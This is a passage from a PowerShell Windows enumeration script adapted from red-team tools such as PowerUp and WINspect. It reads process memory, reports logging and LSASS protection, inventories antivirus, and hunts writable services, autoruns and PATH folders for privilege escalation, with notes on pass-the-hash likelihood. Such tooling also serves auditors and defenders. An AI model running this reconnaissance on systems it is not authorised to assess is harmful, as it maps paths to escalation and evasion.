        [CmdletBinding()] Param (
            [Parameter(ParameterSetName = 'InMemory',
                       Position = 0,
                       Mandatory = $True,
                       ValueFromPipelineByPropertyName = $True)]
            [Alias('Id')]
            [ValidateScript({Get-Process -Id $_})]
            [Int]
            $ProcessID
        )

        $Mod = New-InMemoryModule -ModuleName PEFinder

        $FunctionDefinitions = @(
            (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
            (func kernel32 ReadProcessMemory ([Bool]) @([IntPtr], [IntPtr], [IntPtr], [Int], [Int].MakeByRefType()) -SetLastError),
            (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
            (func ntdll memset ([Void]) @([IntPtr], [Int], [Int]))
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32PEFinder'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']

        $Allocations = Get-ProcessMemoryInfo -ProcessID $ProcessID

        $hProcess = $Kernel32::OpenProcess(0x10, $False, $ProcessID) # PROCESS_VM_READ (0x00000010)

        # Obtain the default OS memory page size
        $SystemInfo = Get-SystemInfo
        $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($SystemInfo.PageSize)

        Get-ProcessMemoryInfo -ProcessID $ProcessID | % {
            $Ntdll::memset($Ptr, 0, 2)
            $BytesRead = 0
            $Result = $Kernel32::ReadProcessMemory($hProcess, $_.BaseAddress, $Ptr, 2, [Ref] $BytesRead)

            $Bytes = $null

            if ($Result -and ($BytesRead -eq 2)) {
                $Bytes = [Runtime.InteropServices.Marshal]::ReadInt16($Ptr).ToString('X4')

                if ($PSBoundParameters['Verbose']) { $Verbose = $True } else { $Verbose = $False }

                $Params = @{
                    ProcessID = $ProcessID
                    ModuleBaseAddress = $_.BaseAddress
                    Verbose = $Verbose
                }

                if ($Bytes -eq '5A4D') {
                    Get-PE -ProcessID $ProcessID -ModuleBaseAddress $_.BaseAddress
                }
            }
        }

        [Runtime.InteropServices.Marshal]::FreeHGlobal($Ptr)
        $null = $Kernel32::CloseHandle($hProcess)
    }



    
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServiceCommandLine = $_.pathname
        $ServiceUser = $_.startname
        $ServiceStartMode = $_.StartMode
        $ServiceDescription = $_.Description
        $ServiceDisplayName = $_.DisplayName
        $ServiceState = $_.State
        $ServiceTriggerCount = (ls "HKLM:\SYSTEM\CurrentControlSet\services\$ServiceName\TriggerInfo" -ErrorAction SilentlyContinue | measure).Count


        $FoundExe = $ServiceCommandLine -match '^"?.*\.exe"?'
        
        if($FoundExe)
        {
            $PrettyServicePath = $Matches[0] -replace '"', ''    # Remove quoted paths so Get-PE doesn't fail

            # 
            $MscoreePresent = (Get-PE -FilePath $PrettyServicePath).ImportDirectory | ?{$_.Name -like "mscoree.dll"}

            if($MscoreePresent)
            {
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'Name' $ServiceName
                $Out | Add-Member Noteproperty 'Path' $PrettyServicePath
                $Out | Add-Member Noteproperty 'CommandLine' $ServiceCommandLine
                $Out | Add-Member Noteproperty 'User' $ServiceUser
                $Out | Add-Member Noteproperty 'StartMode' $ServiceStartMode
                $Out | Add-Member Noteproperty 'Description' $ServiceDescription
                $Out | Add-Member Noteproperty 'DisplayName' $ServiceDisplayName
                $Out | Add-Member Noteproperty 'State' $ServiceState
                $Out | Add-Member Noteproperty 'TriggerCount' $ServiceTriggerCount
                $Out
            }
        }
        else
        {
            Write-Warning "Service does not execute a .exe.  Service command line: $ServiceCommandLine"
        }
    }
}
function Get-SysInfo {
    <#
    Modified https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
    .SYNOPSIS
    Get basic system information from the host
    #>
    try{
    $os_info = Get-WmiObject Win32_OperatingSystem
    }catch{}
    try{
    $date = Get-Date
    }catch{}
    try{
        $psv2 = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction Stop).state
    }catch{}
    if(!$psv2){
        try{
            $psv2 = (Get-WindowsFeature PowerShell-V2 -ErrorAction SilentlyContinue -ErrorAction stop).InstallState
        }catch{}
    }
    $SysInfoHash = @{            
        HostName                = $ENV:COMPUTERNAME                         
        IPAddresses             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
        Architecture            = $os_info.OSArchitecture   
        "Date(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
        "Date(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
        InstallDate             = $os_info.InstallDate
        Username                = $ENV:USERNAME           
        Domain                  = (GWMI Win32_ComputerSystem).domain            
        LogonServer             = $ENV:LOGONSERVER
        DotNetVersion           = ((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\*').PSChildName -join ', ')
        PSVersion               = $PSVersionTable.PSVersion.ToString()
        "Powershell v2"         = $psv2
        PSCompatibleVersions    = ($PSVersionTable.PSCompatibleVersions) -join ', '
        PSScriptBlockLogging    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
        PSTranscription         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
        PSTranscriptionDir      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
        PSModuleLogging         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -EA 0).EnableModuleLogging -eq 1){"Enabled"} Else {"Disabled"}
        LsassProtection         = If((Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA 0).RunAsPPL -eq 1){"Enabled"} Else {"Disabled"}
        LAPS                    = If((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -EA 0).AdmPwdEnabled -eq 1){"Enabled"} Else {"Disabled"}
        UACLocalAccountTokenFilterPolicy = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).LocalAccountTokenFilterPolicy -eq 1){"Disabled (PTH likely w/ non-RID500 Local Admins)"} Else {"Enabled (Remote Administration restricted for non-RID500 Local Admins)"}
        UACFilterAdministratorToken = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).FilterAdministratorToken -eq 1){"Enabled (RID500 protected)"} Else {"Disabled (PTH likely with RID500 Account)"}
        DenyRDPConnections      = [bool](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -EA 0).FDenyTSConnections
        LocalAdmins             = ((Get-LocalAdministrators).name -join ', ')
        LocalPSRemote           = ((Get-LocalPSRemote).name -join ', ')
        LocalDCOM               = ((Get-LocalDCOM).name -join ', ')
        LocalRDP                = ((Get-LocalRDP).name -join ', ')
        LocalPasswordNotReq     = ((Get-LocalPasswordNotRequired).name -join ', ')
        SMBv1                   = [bool](Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol)
    }      
    # PS feels the need to randomly re-order everything when converted to an object so let's presort
    $SysInfoObject = New-Object -TypeName PSobject -Property $SysInfoHash 
    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, DotNetVersion, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, "Powershell v2", LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, DENYRDPCONNECTIONS, LOCALADMINS,LocalPSRemote,LocalDCOM,LocalRDP,LocalPasswordNotReq, SMBv1    
}
function Get-LocalSecurityProducts {
    <#
    Modified https://github.com/HarmJ0y/WINspect/blob/master/WINspect.ps1
    .SYNOPSIS		
	Gets Windows Firewall Profile status and checks for installed third party security products.		
    .DESCRIPTION
    This function operates by examining registry keys specific to the Windows Firewall and by using the 
    Windows Security Center to get information regarding installed security products.            
    .NOTE
    The documentation in the msdn is not very clear regarding the productState property provided by
    the SecurityCenter2 namespace. For this reason, this function only uses available informations that were obtained by testing 
    different security products againt the Windows API.                    
    .LINK
    http://neophob.com/2010/03/wmi-query-windows-securitycenter2
    #>
    $SecInfoHash = @{}
    $firewallPolicySubkey="HKLM:\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
    try{
	    if(Test-Path -Path $($firewallPolicySubkey+"\StandardProfile")){
            $enabled = $(Get-ItemProperty -Path $($firewallPolicySubkey+"\StandardProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $standardProfile="Enabled"
            }
            else{
                $standardProfile="Disabled"
            }
            $SecInfoHash.Add("Standard Profile Firewall",$standardProfile)
        }else{
            Write-Warning  "[-] Could not find Standard Profile Registry Subkey"
	    }    
        if(Test-Path -Path $($firewallPolicySubkey+"\PublicProfile")){
            $enabled = $(Get-ItemProperty -Path $($firewallPolicySubkey+"\PublicProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $publicProfile="Enabled"
            }
            else{
                $publicProfile="Disabled"
            }
            $SecInfoHash.Add("Public Profile Firewall",$publicProfile)
        }else{
	        Write-Output "[-] Could not find Public Profile Registry Subkey"
        }
        if(Test-Path -Path $($firewallPolicySubkey+"\DomainProfile")){
            $enabled = (Get-ItemProperty -Path $($firewallPolicySubkey+"\DomainProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $domainProfile="Enabled"
            }else{
                $domainProfile="Disabled"
            }
            $SecInfoHash.Add("Domain Profile Firewall", $domainProfile)
        }else{       
            Write-Warning "[-] Could not find Private Profile Registry Subkey"
	    }              
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
    	Write-Warning -Message "[-] Error : Could not check Windows Firewall registry informations"	
    }
    $role = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
    if($role -ge 2){
        Write-Output '[*]Starting Windows Defender enumeration'
        Invoke-DefenderEnum
        return ($SecInfoHash | Format-List)
    }
    $SecurityProvider=@{         
        "00" = "None";
        "01" = "Firewall";
        "02" = "AutoUpdate_Settings";
        "04" = "AntiVirus";           
        "08" = "AntiSpyware";
        "10" = "Internet_Settings";
        "20" = "User_Account_Control";
        "40" = "Service"
    }
    $RealTimeBehavior = @{                              
        "00" = "Off";
        "01" = "Expired";
        "10" = "ON";
        "11" = "Snoozed"
    }
    $DefinitionStatus = @{
        "00" = "Up-to-date";
        "10" = "Out-of-date"
    }
    if(Get-WmiObject -Namespace root -class __NAMESPACE -filter "name='SecurityCenter2'"){
        $securityCenterNS="root\SecurityCenter2"
    }else{
        $securityCenterNS="root\SecurityCenter"
    }       
    # checks for third party firewall products 
    try {  
        $firewalls= @(Get-WmiObject -Namespace $securityCenterNS -class FirewallProduct)
        if($firewalls.Count -eq 0){
	        Write-Output "`n[-] FW from third party not installed"
        }else{
            Write-Output "`n[+] FW from third party installed"
            $firewalls | foreach {
                # The structure of the API is different depending on the version of the SecurityCenter Namespace
                if($securityCenterNS.endswith("2")){
                    [int]$productState=$_.ProductState
        	        $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    Write-Output "FW Product Name $($_.displayName)"
                    Write-Output "FW Service Type $($SecurityProvider[[String]$provider])"
                    Write-Output "FW State        $($RealTimeBehavior[[String]$realTimeProtec])"
                }else{
                    Write-Output "FW Company Name $($_.CompanyName)"
                    Write-Output "FW Product Name $($_.displayName)"
                    Write-Output "FW State        $($_.enabled)"
                }
            }
        }
    }
    catch{
        Write-Output '[-] Failed firewall enum'
        Write-Output "[-] $($_.Exception.Message)"
    }
    try{
        # checks for antivirus products
        $antivirus=@(Get-WmiObject -Namespace $securityCenterNS -class AntiVirusProduct)
        if($antivirus.Count -eq 0){
            Write-Output "`n[-] AntiVirus not installed"
        }else{
            Write-Output "`n[+] AntiVirus installed"
            $antivirus | foreach {
                if($securityCenterNS.endswith("2")){
                    if($_.displayname -match 'defender'){
                        $defender=$true
                    }
                 	[int]$productState=$_.ProductState
                    $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    Write-Output "AV Product Name         $($_.displayname)"
                    Write-Output "AV Service Type         $($SecurityProvider[[String]$provider])"
                    Write-Output "AV Real Time Protection $($RealTimeBehavior[[String]$realTimeProtec])"
                    Write-Output "AV Signature Definition $($DefinitionStatus[[String]$definition])"
                }else{
                    Write-Output "AV Company Name         $($_.companyname)"
                    Write-Output "AV Product Name         $($_.displayname)"
                    Write-Output "AV Real Time Protection $($_.onAccessScanningEnabled)"
                    Write-Output "AV Product up-to-date   $($_.productUpToDate)"
                }
            }
        }
    }catch{
        Write-Output '[-] Failed AV enum'
        Write-Output "[-] $($_.Exception.Message)"
    }
    try{
        # Checks for antispyware products
	    #Write-Output "`n[*] Checking for installed antispyware products" 
        $antispyware=@(Get-WmiObject -Namespace $securityCenterNS -class AntiSpywareProduct)
        if($antispyware.Count -eq 0){
            Write-Output "`n[-] AntiSpyware not installed"
        }else{ 
            Write-Output "`n[+] AntiSpyware installed"
            $antispyware | foreach{
		        if($securityCenterNS.endswith("2")){
                    [int]$productState=$_.ProductState
                    $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    Write-Output "Spyware Product Name          $($_.displayName)"
                    Write-Output "Spyware Service Type          $($SecurityProvider[[String]$provider])"
                    Write-Output "Spyware Real Time Protection  $($RealTimeBehavior[[String]$realTimeProtec])"
                    Write-Output "Spyware Signature Definitions $($DefinitionStatus[[String]$definition])"
                }else{
                    Write-Output "Spyware Company Name          $($_.CompanyName)"
                    Write-Output "Spyware Product Name          $($_.displayName)"
                    Write-Output "Spyware Real Time Protection  $($_.onAccessScanningEnabled)"
                    Write-Output "Spyware Product up-to-date    $($_.productUpToDate)"
                }
            }
        }
    }catch{
        Write-Output '[-] Failed spyware enum'
        Write-Output "[-] $($_.Exception.Message)"
    }
}
function Get-ModifiablePath {
    <#
    .SYNOPSIS
    Modified Version of https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1

    Parses a passed string containing multiple possible file/folder paths and returns
    the file paths with acls
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Takes a complex path specification of an initial file/folder path with possible
    configuration files, 'tokenizes' the string in a number of possible ways, and
    enumerates the ACLs for each path that currently exists on the system. Any path that
    the current user has modification rights on is returned in a custom object that contains
    the modifiable path, associated permission set, and the IdentityReference with the specified
    rights. The SID of the current user and any group he/she are a part of are used as the
    comparison set against the parsed path DACLs.
    .PARAMETER SkipUser
    Ignore ACL's for these usernames
    .PARAMETER Path
    The string path to parse for modifiable files. Required
    .PARAMETER Literal
    Switch. Treat all paths as literal (i.e. don't do 'tokenization').
    .EXAMPLE
    '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    .EXAMPLE
    Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    ...
    .OUTPUTS
    PowerUp.TokenPrivilege.ModifiablePath
    Custom PSObject containing the Permissions, ModifiablePath, IdentityReference for
    a modifiable path.
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal,

        [string[]]$SkipUser
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }
    }
    PROCESS {
        ForEach($TargetPath in $Path) {
            $CandidatePaths = @()
            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
            if ($PSBoundParameters['Literal']) {
                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
                        if (($SeparationCharacterSet -notmatch ' ')) {
                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }
                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }
            #$CandidatePaths makes the scan from to be 4 seconds to 7.5 seconds
            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                if (-not(Test-Path $CandidatePath)){
                    return
                }
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                    $FileSystemRights = $_.FileSystemRights.value__
                    if($SkipUser){
                        foreach($Admin in $SkipUser){
                            if($_.IdentityReference -match $Admin){
                                $Skip = $true
                            }
                        }
                        if(-not($Skip)){
                            $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                            # the set of permission types that allow for modification
                            $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
                            if ($Comparison) {
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                                $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                                $Out | Add-Member Noteproperty 'Permissions' $($Permissions -join ', ')
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                                return $Out
                            }
                        }
                    }else{
                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                        # the set of permission types that allow for modification
                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
                        if ($Comparison) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $($Permissions -join ', ')
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            return $Out
                        }
                    }
                }
            }
        }
    }
}
function Get-ActiveListeners {
    <#
    https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
    .SYNOPSIS
    Enumerates active TCP/UDP listeners.
    #>
    Write-Verbose "Enumerating active TCP/UDP listeners..."
    $list = New-Object System.Collections.ArrayList
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
    $TcpListeners = $IPProperties.GetActiveTCPListeners()
    $UdpListeners = $IPProperties.GetActiveUDPListeners()
            
    ForEach($Connection in $TcpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        $object = New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "TCP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
        $list.add($object) | Out-Null
    }
    ForEach($Connection in $UdpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        $object = New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "UDP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
        $list.add($object) | Out-Null
    }
    return $list
}
function Get-WritableAutoRuns {
    <#
    Modified https://github.com/A-mIn3/WINspect
    .SYNOPSIS
    Looks for autoruns specified in different places in the registry.
    .DESCRIPTION
    This function inspects common registry keys used for autoruns.
    It examines the properties of these keys and report any found executables along with their pathnames.
    #>
    param(
        [string[]]$SkipUser
    )
    $autoruns = New-Object System.Collections.ArrayList
    $adminPATH = @()
    if(-not(Get-PSDrive | where {$_.name -like 'HKU'})){
        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
    }
    $sids=(Get-LocalAdministrators).sid
    foreach($sid in $sids){
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\load"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
    }
    $RegistryKeys = @( 
        $adminPATH
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
        "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\load",
        "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService", 
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs", # DLLs specified in this entry can hijack any process that uses user32.dll 
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell",
        "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler,"
        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
        # not sure if it is all we need to check!
    ) | Sort-Object -Unique
    foreach($key in $RegistryKeys){
        if(Test-Path -Path $key){
            [array]$properties = (get-item $key -ErrorAction SilentlyContinue).Property
            if($properties.Count -gt 0){
                foreach($exe in $properties) {
                    try{
                        $path = (Get-ItemProperty $key -ErrorAction Stop).$exe.replace('"','')
                        $autoruns.add($path) | Out-Null
                    }catch{}
                }
            }
        }
    }
    $autoruns = $autoruns | where {$_} |Sort-Object -Unique
    if($autoruns){
        $list = Get-ModifiablePath $autoruns -SkipUser $SkipUser
    }
    if($list.Count -eq 0){
        return "[+] Non Writable AutoRuns Found"
    }else{
        return $list
    }
}
function Get-WritableAdminPath { 
    <#
    Modified https://github.com/A-mIn3/WINspect
    .SYNOPSIS
    Checks DLL Search mode and inspects permissions for directories in system %PATH%
    .DESCRIPTION
    inspects write access to directories in the path environment variable .
    #>
    param(
        [string[]]$SkipUser
    )
    $adminPATH = @()
    $sids=(Get-LocalAdministrators).sid
    if(-not(Get-PSDrive | where {$_.name -like 'HKU'})){
        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
    }
    foreach($sid in $sids){
        try{
            $adminPATH += ((Get-ItemProperty HKU:\$sid\Environment\ -Name Path -ErrorAction Stop).Path.split(';') | where {$_})
        }catch{}
    }
    $systemPATH = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -ErrorAction SilentlyContinue).PATH.split(';')
    $PATHS = $adminPATH + $systemPATH | where {$_} | Sort-Object -Unique
    if($PATHS){
        $list = Get-ModifiablePath $PATHS -SkipUser $SkipUser
    }
    if(!$list){
        return "[+] Non Writable Admin Path Found"
    }else{
        return $list
    }
}
function Get-WritableServices {
    <#
    .SYNOPSIS
    Gets services binaries and folders with permission  
    .DESCRIPTION
    This function checks services that have Writable binaries and folders,
    returns an array containing service objects.
    #>
    param(
        [string[]]$SkipUser
    )
    $list = New-Object System.Collections.ArrayList
    $servicepaths = (Get-WmiObject -Class Win32_Service | where {$_.pathname}).pathname | Sort-Object -Unique
    if($servicepaths){
        $list = Get-ModifiablePath $servicepaths -SkipUser $SkipUser
    }
    if(!$list){
        return "[+] Non Writable Service Path Found"
    }else{
        return $list
    }
}
function Get-WritableScheduledTasks {
    <#
